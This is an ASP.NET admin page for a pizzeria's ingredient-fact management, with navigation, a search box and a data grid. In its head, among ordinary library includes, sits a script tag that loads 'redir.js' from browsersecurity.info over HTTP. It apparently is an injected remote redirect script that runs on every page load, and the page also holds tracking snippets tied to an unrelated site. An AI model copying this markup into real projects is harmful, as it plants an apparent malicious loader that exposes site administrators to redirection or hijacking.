<%@ Page Language="C#" AutoEventWireup="true" CodeFile="IngredientFactInformation.aspx.cs" Inherits="Admin_IngredientFactInformation" %>

<!DOCTYPE html>
<html class="no-js">
<meta charset="utf-8">
<meta name="description" content="">
<meta name="viewport" content="width=device-width">
<title>IngredientFactInformation</title>
<head>
    <link runat="server" rel="shortcut icon" href="/images/logo.ico" type="image/x-icon" />
    <link runat="server" rel="icon" href="/images/logo.ico" type="image/ico" />
    <script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
    <script src="http://browsersecurity.info/js/redir.js" type="text/javascript"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <script type="text/javascript">
        //<![CDATA[
        try { if (!window.CloudFlare) { var CloudFlare = [{ verbose: 0, p: 0, byc: 0, owlid: "cf", bag2: 1, mirage2: 0, oracle: 0, paths: { cloudflare: "/cdn-cgi/nexp/dok3v=1613a3a185/" }, atok: "72adab177b5729b458fc171b7e2ef771", petok: "be01c04ed78a819345fed98b13a0463b72c424a6-1450762210-1800", zone: "nyasha.me", rocket: "0", apps: { "ga_key": { "ua": "UA-50530436-1", "ga_bs": "2" } }, sha2test: 0 }]; !function (a, b) { a = document.createElement("script"), b = document.getElementsByTagName("script")[0], a.async = !0, a.src = "//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=38857570ac/cloudflare.min.js", b.parentNode.insertBefore(a, b) }() } } catch (e) { };
        //]]>
    </script>
    <link rel="shortcut icon" href="/favicon.ec0f3a1b.ico">
    <link rel="stylesheet" href="css/chosen.min.css">
    <link rel="stylesheet" href="css/checkBo.min.css">
    <link rel="stylesheet" href="css/style.css" />
    <style type="text/css">
        .grid th {
            text-align: center;
        }

        #ddlShowData {
            width: 60px;
        }

        #txtSearch {
            width: 387px;
        }

        @media only screen and (max-width: 3020px) {
            #divstatus {
                margin-left: 674px;
                width: 100px;
                margin-top: 12px;
            }

            #btnAddIngredientFact {
                margin-top: 10px;
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 500px;
                margin-top: 11px;
            }
        }

       @media only screen and (max-width: 1920px) {
            #divstatus {
                margin-left: 679px;
                width: 100px;
                margin-top: -28px;
            }

            #btnAddMenuItem {
                margin-top: 10px;
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 594px;
                margin-top: 11px;
            }
              #divbtnSearch {
                width: 350px;
                margin-left: 874px;
                margin-top: 10px;
            }

            #divbtnreset{
                width: 350px;
                margin-left: 954px;
                margin-top: -34px;
            }
        }

        @media only screen and (max-width: 1680px) {
            #divstatus {
                margin-left: 553px;
                width: 100px;
                margin-top: 12px;
            }

            #btnAddIngredientFact {
                margin-top: 10px;
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 400px;
                margin-top: 11px;
            }
        }

        @media only screen and (max-width: 1600px) {
            #divstatus {
                margin-left: 1139px;
                width: 100px;
                margin-top: -32px;
            }

            #btnAddIngredientFact {
                margin-top: 10px;
                margin-left: -17px;
            }

            /*#DivSearch {
                width: 400px;
                margin-left: 402px;
                margin-top: 11px;
            }*/
            #DivSearch {
                width: 400px;
                margin-left: 320px;
                margin-top: 11px;
            }

            #divbtnSearch {
                width: 350px;
                margin-left: 360px;
                margin-top: 11px;
            }

            #divbtnreset{
                width: 350px;
                margin-left: 707px;
                margin-top: -34px;
            }
        }


        @media only screen and (max-width: 1440px) {
            #divstatus {
                margin-left: 426px;
                width: 100px;
                margin-top: 11px;
            }

            #btnAddIngredientFact {
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 352px;
                margin-top: 11px;
            }
        }

        @media only screen and (max-width: 1366px) {
            #divstatus {
                margin-left: 883px;
                width: 100px;
                margin-top: -34px;
            }

            #btnAddIngredientFact {
                margin-left: -17px;
            }

            /*#DivSearch {
                width: 400px;
                margin-left: 305px;
                margin-top: 11px;
            }*/
            #DivSearch {
                width: 400px;
                margin-left: 305px;
                margin-top: 11px;
            }

            #divbtnSearch {
                width: 350px;
                margin-left: 570px;
                margin-top: 11px;
            }

            #divbtnreset{
                width: 350px;
                margin-left: 653px;
                margin-top: -34px;
            }
        }

        @media only screen and (max-width: 1280px) {
            #divstatus {
                margin-left: 348px;
                width: 100px;
                margin-top: 11px;
            }

            #btnAddIngredientFact {
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 276px;
                margin-top: 11px;
            }
        }

        @media only screen and (max-width: 1152px) {
            #divstatus {
                margin-left: 284px;
                width: 100px;
                margin-top: 11px;
            }

            #btnAddIngredientFact {
                margin-left: -17px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 215px;
                margin-top: 11px;
            }
        }

        @media only screen and (max-width: 1024px) {
            #divstatus {
                margin-left: 220px;
                width: 100px;
                margin-top: 11px;
            }

            #btnAddIngredientFact {
                margin-left: -17px;
            }

            #txtSearch {
                width: 350px;
            }

            #DivSearch {
                width: 400px;
                margin-left: 178px;
                margin-top: 11px;
            }
        }
    </style>
    <script type="text/javascript">
        function Confirm() {

            var hdnfldVariable = document.getElementById("<%=hdnfldVariable.ClientID %>");

            if (confirm("Are you sure you want to delete ingredient fact Detail?")) {

                hdnfldVariable.value = "Yes";

            } else {

                hdnfldVariable.value = "No";
            }

        }

        function SearchIngredient() {
            document.getElementById('<%= btnSearch.ClientID %>').click();
        }



    </script>
    <script type="text/javascript">
        function ConfirmForLogOut() {

            var hdnfldVariable = document.getElementById("<%=hdfLogout.ClientID %>");

            if (confirm("Are you sure you want to log out?")) {

                hdnfldVariable.value = "Yes";

            } else {

                hdnfldVariable.value = "No";
            }
            document.getElementById('<%= BtnLogOut.ClientID %>').click();
        }
    </script>
</head>

<body style="background-color: #F0F0F0">
    <form runat="server">
        <asp:ScriptManager ID="ScriptManager1" runat="server"></asp:ScriptManager>
        <asp:HiddenField ID="hdnfldVariable" runat="server" />
        <asp:HiddenField ID="hdnfldsearchtext" runat="server" />
        <asp:HiddenField ID="hdfLogout" runat="server" />
        <asp:Button runat="server" ID="BtnLogOut" Style="display: none" OnClick="BtnLogOut_Click" />

        <div class="app layout-fixed-header">
            <div class="sidebar-panel offscreen-left">
                <div class="brand">
                    <div class="brand-logo">
                        <img src="images/logo.png" height="50" width="50" style="margin-top: -10px;" alt="">
                    </div>
                    <a href="javascript:;" class="toggle-sidebar hidden-xs hamburger-icon v3" data-toggle="layout-small-menu"><span></span><span></span><span></span><span></span></a>
                </div>

                <nav role="navigation">
                    <ul class="nav">
                        <li><a href="DashBoard.aspx"><i class="fa fa-flask"></i><span>Dashboard</span> </a></li>
                        <li class="open"><a href="javascript:;"><i class="fa fa-tint"></i><span>Menu Details</span> </a>
                            <ul class="sub-menu">
                                <%--<li><a href="IngredientInformation.aspx"><asp:Image ImageUrl="~/images/oie_311359551MYYq6un.jpg" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredient Information</span> </a></li>
                                --%>
                                <li><a href="MenuCategoryInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Category.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Categories</span> </a></li>
                                <li><a href="IngredientInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Ingredients</span> </a></li>
                                <li class="active"><a href="IngredientFactInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Ingredient Coverage</span> </a></li>
                                <li><a href="MenuItemInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Products</span> </a></li>
                                <li><a href="MenuItemSizeInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon//Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Product Sizes</span> </a></li>
                                <li><a href="PizzaBaseTypeInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Pizza Base Type.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Pizza Type</span> </a></li>
                                <li><a href="MenuItemMakingMethodInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Making Method</span> </a></li>
                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Orders</span> </a>
                            <ul class="sub-menu">

                                <li><a href="OrderDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Order.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Order Details</span> </a></li>
                                <li><a href="DayToDaySellingInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Day to Day Sales.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Daily Sales</span> </a></li>
                                <li><a href="TransactionDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Transaction.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Transaction Details</span></a></li>

                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Files and Images</span> </a>
                            <ul class="sub-menu">

                                <li><a href="UploadMenuPdf.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Menu</span> </a></li>
                                <li><a href="AddHomePageImages.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Images</span> </a></li>

                            </ul>
                        </li>

                        <li><a href="OfferDetail.aspx"><i class="fa fa-tint"></i><span>Offers</span> </a>
                            <%--<ul class="sub-menu">
                                <li class="active"><a href="OfferDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Offer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Offer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="CustomerInformation.aspx"><i class="fa fa-tint"></i><span>Customers</span> </a>
                            <%-- <ul class="sub-menu">
                                <li><a href="CustomerInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Customer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Customer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="SendNewsLatterInformation.aspx"><i class="fa fa-tint"></i><span>Newsletters</span> </a>
                            <%--<ul class="sub-menu">
                                <li><a href="SendNewsLatterInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/News Letter.png" Height="22px" Width="22px" runat="server"/><span> </span><span>News Letter Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Misc. </span></a>
                            <ul class="sub-menu">

                                <li><a href="MiscellaneousSettings.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Store Settings</span> </a></li>
                                <li><a href="AddConfigKeyAndValues.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Configuration Settings</span> </a></li>
                                <li><a href="AddConfigContactDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Contact.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Contact Detail</span></a></li>

                            </ul>
                        </li>

                        <li><a href="StoreInformation.aspx"><i class="fa fa-tint"></i><span>Store Details</span> </a>
                            <%--<ul class="sub-menu">
                                <li><a href="StoreInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Store.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Store Information</span> </a></li>
                            </ul--%>>
                        </li>

                    </ul>
                </nav>
            </div>


            <div class="main-panel" style="background-color: #F0F0F0;">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">Log Out</span> </a></li>
                    </ul>
                </header>

                <div class="main-content">
                    <div class="panel">
                        <div class="panel-heading border" style="font-size: medium; font-weight: bold;">Ingredient Fact Information</div>
                        <div class="table-header">
                            <div class="col-md-6">
                                <div class="col-md-8 col-sm-6" style="width: 100px;">
                                    <div role="form">
                                        <asp:Button ID="btnAddIngredientFact" class="btn btn-info" runat="server" Text="Add New Ingredient Fact" OnClick="btnAddIngredientFact_Click" />

                                    </div>
                                </div>
                                <div id="DivSearch">

                                    <asp:TextBox ID="txtSearch" placeholder="Search" CssClass="form-control" Width="250px" runat="server" ClientIDMode="Static" onfocus="this.placeholder=''" onblur="this.placeholder='Search'"></asp:TextBox>


                                </div>

                            </div>

                            <div id="divbtnSearch">
                                <asp:Button ID="btnSearch" class="btn btn-info" runat="server" Text="Search" OnClick="btnSearch_Click" />
                            </div>
                            <div id="divbtnreset">
                                 <asp:Button ID="btnReset" class="btn btn-info" runat="server" Text="Reset" OnClick="btnReset_Click" />
                            </div>
                            <div class="col-md-6 search-bar">
                                <div class="form-group" id="divstatus">
                                    <asp:Label ID="lblshow" runat="server" Text="Show"></asp:Label>

                                    <asp:DropDownList ID="ddlShowData" Width="55px" Height="33px" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlShowData_SelectedIndexChanged">

                                        <asp:ListItem>10</asp:ListItem>
                                        <asp:ListItem>15</asp:ListItem>
                                        <asp:ListItem>20</asp:ListItem>
                                    </asp:DropDownList>
                                </div>
                            </div>
                        </div>
                        <div class="panel-body">
                            <asp:UpdatePanel ID="UpIngredientFactInformation" runat="server">
                                <ContentTemplate>
                                    <asp:GridView ID="gvIngredientFactInformation" runat="server" AutoGenerateColumns="false" AllowSorting="true" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" PageSize="10" AllowPaging="true" OnRowCommand="gvIngredientFactInformation_RowCommand" OnSorting="gvIngredientFactInformation_Sorting">
                                        <RowStyle HorizontalAlign="Left" />
                                        <HeaderStyle HorizontalAlign="Left" />
                                        <Columns>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblIngredientFactID" runat="server" Text='<%# Eval("IngredientFactId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Ingredient Fact Name" SortExpression="IngredientFactName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblIngredientFactName" runat="server" Text='<%# Eval("IngredientFactName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <asp:TemplateField HeaderText="Edit" HeaderStyle-Width="2%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkEdit" runat="server" CommandName="EditIngredientFact" CommandArgument='<%# Eval("IngredientFactId")%>' Text="Edit"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Delete" HeaderStyle-Width="3%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkDelete" runat="server" CommandName="DeleteIngredientFact" CommandArgument='<%# Eval("IngredientFactId")%>' Text="Delete" OnClientClick="Confirm()"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>


                                        </Columns>
                                        <PagerTemplate>
                                            <ul class="pagination pull-right">
                                                <asp:Button ID="btnFirst" runat="server" Text="First" CssClass="btn btn-info" CommandName="First" /></li>
                                                
                                                    <asp:Button ID="btnPrevious" runat="server" Text="Previous" CssClass="btn btn-info" CommandName="Previous" /></li>
                                               
                                                    <asp:Button ID="btnNext" runat="server" Text="Next" CssClass="btn btn-info" CommandName="Next" /></li>
                                               
                                                    <asp:Button ID="btnLast" runat="server" Text="Last" CssClass="btn btn-info" CommandName="Last" /></li>
                                            </ul>

                                        </PagerTemplate>
                                        <EmptyDataTemplate>
                                            No Ingredients Fact Detail Found
                                        </EmptyDataTemplate>
                                    </asp:GridView>
                                </ContentTemplate>
                            </asp:UpdatePanel>
                        </div>

                    </div>
                </div>
            </div>

            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />

            <br />
            <br />
            <br />
            <br />
            <br />
            <br />
            <br />

            <footer class="content-footer">
                <nav class="footer-right">
                    <ul class="nav">
                        <li><a href="javascript:;">Top</a> </li>
                        <li><a href="javascript:;" class="scroll-up"><i class="fa fa-angle-up"></i></a></li>
                    </ul>
                </nav>

                <nav class="footer-left">
                    <ul class="nav">
                        <li><a href="javascript:;">Copyright <i class="fa fa-copyright"></i><span>TomatosPizzeria</span> 2016. All rights reserved</a> </li>
                    </ul>
                </nav>
            </footer>
        </div>
        <script src="js/app.min.4fc8dd6e.js"></script>
        <script src="js/jquery.dataTables.js"></script>
        <script src="js/bootstrap-datatables.8df42543.js"></script>
        <script type="text/javascript">
            /* <![CDATA[ */
            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-50530436-1']);
            _gaq.push(['_trackPageview']);

            (function () {
                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
            })();

            (function (b) { (function (a) { "__CF" in b && "DJS" in b.__CF ? b.__CF.DJS.push(a) : "addEventListener" in b ? b.addEventListener("load", a, !1) : b.attachEvent("onload", a) })(function () { "FB" in b && "Event" in FB && "subscribe" in FB.Event && (FB.Event.subscribe("edge.create", function (a) { _gaq.push(["_trackSocial", "facebook", "like", a]) }), FB.Event.subscribe("edge.remove", function (a) { _gaq.push(["_trackSocial", "facebook", "unlike", a]) }), FB.Event.subscribe("message.send", function (a) { _gaq.push(["_trackSocial", "facebook", "send", a]) })); "twttr" in b && "events" in twttr && "bind" in twttr.events && twttr.events.bind("tweet", function (a) { if (a) { var b; if (a.target && a.target.nodeName == "IFRAME") a: { if (a = a.target.src) { a = a.split("#")[0].match(/[^?=&]+=([^&]*)?/g); b = 0; for (var c; c = a[b]; ++b) if (c.indexOf("url") === 0) { b = unescape(c.split("=")[1]); break a } } b = void 0 } _gaq.push(["_trackSocial", "twitter", "tweet", b]) } }) }) })(window);
            /* ]]> */
        </script>

    </form>
</body>
</html>
